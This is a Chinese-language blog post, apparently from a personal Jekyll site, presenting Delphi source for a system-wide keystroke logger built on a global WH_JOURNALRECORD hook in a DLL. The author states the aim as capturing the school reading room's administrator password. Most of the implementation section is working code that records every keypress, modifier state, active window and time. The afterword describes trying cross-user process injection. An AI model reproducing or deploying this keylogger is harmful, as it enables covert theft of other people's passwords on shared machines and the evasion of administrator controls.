---
layout: post
published: true
title: 一个键盘钩子的写法，很实用
categories: 编程
tags: [Delphi, win32]
---

## 0x00 前言

早就想写一个键盘监听器了，学校的电子阅览室设了Administrator屏障，想装软件什么的很麻烦，因此想截获管理员密码。。    

花了大概一个星期编写了一个，效果还不错，因此来分享一下。。
 
## 0x01 基本概念
 
 首先解释一下什么是键盘钩子：
 
 > 钩子（Hook）是Windows消息处理机制中的一个监视点，应用程序可以在这里安装一个子程序（钩子函数）以监视指定窗口某种类型的消息，所监视的窗口可以是其他进程创建的。当消息到达后，在目标窗口处理函数处理之前，钩子机制允许应用程序截获它进行处理。     
 
SetWindowsHookEx函数可以把应用程序定义的钩子函数安装到系统中：

```pascal
HHOOK SetWindowsHookEx(
    Int idHook ;       // 指定钩子的类型
    HOOKPROC lpfn;   //钩子函数的地址。如果使用的是远程钩子，钩子函数必须放在一个DLL中。
    HINSTANCE hMod; //钩子函数所在DLL的实例句柄。如果是一个局部的钩子，该参数为NULL。
    DWORD    dwThreadID; //指定要为哪个线程安装钩子。若该值为0被解释成系统范围内的。
)
```

IdHook参数指定了要安装的钩子的类型，可以是下列取值之一：

 * WH_CALLWNDPROC      当目标线程调用SendMessage函数发送消息时，钩子函数被调用。
 * WH_CALLWNDPROCRET                  当SendMessage发送的消息返回时，钩子函数被调用。
 * WH_GETMESSAGE          当目标线程调用GetMessage或者PeekMessage时。
 * WH_KEYBOARD              当从消息队列中查询WM_KEYUP或WM_KEYDOWN消息时
 * WH_MOUSE                      当调用从消息队列中查询鼠标事件消息
 * WH_MSGFILTER              当对话框，菜单或滚动条要处理一个消息时，钩子函数被调用。该钩子是局部的，它是为哪些有自己消息处理过程的控件对象设计的。
 * WH_SYSMSGFILTER       和WH_MSGFILTER一样，只不过是系统范围的。
 * WH_JOURNALRECORD 当Windows从硬件队列中获取消息时。
 * WH_JOURNALPLAYBACK      当一个事件从系统的硬件输入队列中别请求时
 * WH_SHELL                        当关于Windows外壳事件发生时，比如任务条需要重画它的按钮
 * WH_CBT                            当基于计算机的训练（CBT）事件发生时。
 * WH_FOREGROUNDIDLE Windows自己使用，一般应用程序很少使用。
 * WH_DEBUG                      用来给钩子函数除错。

 
Lpfn参数是钩子函数的地址。钩子安装后如果有消息发生，Windows将调用此参数所指向的函数。

如果dwThreadId参数是0，或者指定一个由其他进程创建的线程ID，lpfn参数指向的钩子函数必须位于一个DLL中。这是因为进程的地址空间是相互隔离的，发生事件的进程不能调用其他进程地址空间的钩子函数。如果钩子函数的实现代码在DLL中，在相关事件发生时，系统会把这个DLL插入到发生事件的进程的地址空间，使它能够调用钩子函数。这种需要将钩子函数写入DLL以便挂钩其他进程事件的钩子称为**远程钩子**。

如果dwThreadId参数指定一个由自身进程创建的线程ID，lpfn参数指向的钩子函数只要在当前进程中即可，不必非要写入DLL。这种挂钩属于自身进程事件的钩子称为局部钩子。
 
hMod参数是钩子函数所在DLL的实例句柄，如果钩子函数不再DLL中，应将hMod设置为NULL。
 
dwThreadId参数指定要与钩子函数相关联的线程ID号。如果设为0，那么钩子就是系统范围内的，即钩子函数将关联到系统内所有线程。
 
要卸载钩子，可以调用UnhookWindowsHookEx函数。
 BOOL UnhookWindowsHookEx(HHOOK hhk); // hhk 为要卸载的钩子的句柄
 
注意：安装钩子的代码可以在DLL模块中，也可以在主模块中，但是一般在DLL里实现它，主要是为了使程序更加模块化。
 
既然我们要截获的是全局的按键消息，那么就应该将钩子放在DLL中。

Windows钩子都有一个回调函数：

```c
LRESULT CALLBACK HookProc(int nCode, WPARAM wParam, LPARAM lParam)
{
         // 处理该消息的代码 …..
 
    Return ::CallNextHookEx(hHook,nCode,wParam,lParam);
}
```

HookProc是应用程序的名称。nCode参数是Hook代码，钩子函数使用这个参数来确定任务，它的值依赖于Hook的类型。wParam和lParam参数的值依赖于Hook代码，但是它们典型的值是一些关于发送或者接收消息的信息。

因为系统中可能会有多个钩子的存在，所以要调用那个CallNextHookEx函数把消息传到链中下一个钩子函数。hHook参数是安装钩子时得到的钩子句柄（SetWindowsHookEx的返回值）。
 
## 0x02 实现

有了这些知识，我们就可以开始编写：
 
首先，先创建一个DLL Wizard，为了在主程序中创建钩子，我们需要键入以下代码：

```pascal
procedure InstallHook(hwnd:THandle);stdcall;export;
begin
    hook:=SetWindowsHookEx(WH_JOURNALRECORD,HookProc,hInstance,0);//其中hook是一个HHOOK类型的全局变量，用来保存钩子句柄
    hWindow:=hwnd;//hWindow也是一个HWND类型的全局变量，用来保存主程序的窗口句柄，在后面要用到
end;
```
 
由于DLL与主程序是独立的，所以DLL截获的消息需要发送到主窗口，这里采用的是发送消息，因此要保留主窗体句柄
 
下面是卸载钩子代码：

```pascal
procedure UnInstallHook;stdcall;export;
begin
  UnhookWindowshookEx(hook);
end;
```
 
还有回调函数：

```pascal
function HookProc(iCode:longint;
         wParam:WPARAM;lParam:LPARAM):LRESULT;stdcall;
var
  msg:TEventMsg;
  keyState:TKeyState;
begin
  if iCode=HC_ACTION then
  begin
    msg:=PEventMsg(lParam)^;
    if (msg.message=WM_KEYDOWN) or (msg.message=WM_SYSKEYDOWN) then
    begin
      keystate.vKey:=LoByte(msg.paramL);//得到键的虚拟键码
      keystate.bCapsLock:=GetKeyState(VK_CAPITAL)=1;//得到CapsLock键状态
      keyState.bNumLock:=GetKeyState(VK_NUMLOCK)<>1;//得到Num Lock的状态
      keyState.bCtrl:=GetKeyState(VK_CONTROL) and $80000000=$80000000;//得到Ctrl键的状态
      keyState.bAlt:=GetKeyState(VK_MENU) and $80000000=$80000000;//得到Alt键的状态
      keyState.bShift:=GetKeyState(VK_SHIFT) and $80000000=$80000000;//得到Shift键的状态
      keystate.Sender:=GetActiveWindow;//得到当前活动的窗口句柄
      keystate.Time:=Now;//得到当前时间
      SendMessage(hWindow,WM_MYMSG,Integer(@KeyState),0);//发给主窗口，WM_MYMSG为一个自定义消息，用于区别于其他消息
    end;
    result:=0;
  end;
  if iCode<0 then
  begin
    Result:=CallNextHookEx(hook,iCode,wParam,lParam);//挂上下一个钩子
  end;
end;
```
 
其中TKeyState定义为：

```pascal
type
  TKeyState=record
               vKey:longint;
               bCapsLock,bNumLock,bShift,bCtrl,bAlt:bool;
               Sender:HWND;
               Time:TDateTime;
             end;
```

用于记录按键消息。

最后将他们输出：

```pascal
exports
  InstallHook,UnInstallHook,HookProc;
```

在主窗体Main.pas中写入：

```pascal
procedure InstallHook(hwnd:THandle);stdcall;external 'Hookdll';
procedure UnInstallHook;stdcall;external 'hookdll';//静态链接函数
```
 
然后调用时用`InstallHook(self.Handle);`就可以安装钩子了。
 
至此一个键盘监听器就写好了（详细参考CSDN资源：4428899）
 
## 0x03 后记 
 
但是，这个程序还有一点缺陷，就是不能跨用户监听，即如果一台电脑中有多个用户，则用户A的监听器监听不到用户B的按键消息。

我研究过，用户的实质是多个Desktop（即窗口工作站）同时运行（这也是虚拟桌面的工作原理）。我曾试图用CreateProcess()这个API将一个进程跨用户注入到另一个用户的空间中，虽说成功了，但一旦用户切换用户，所有的钩子都将停止，这也令我很苦恼，如果有兴趣的也可以研究一下。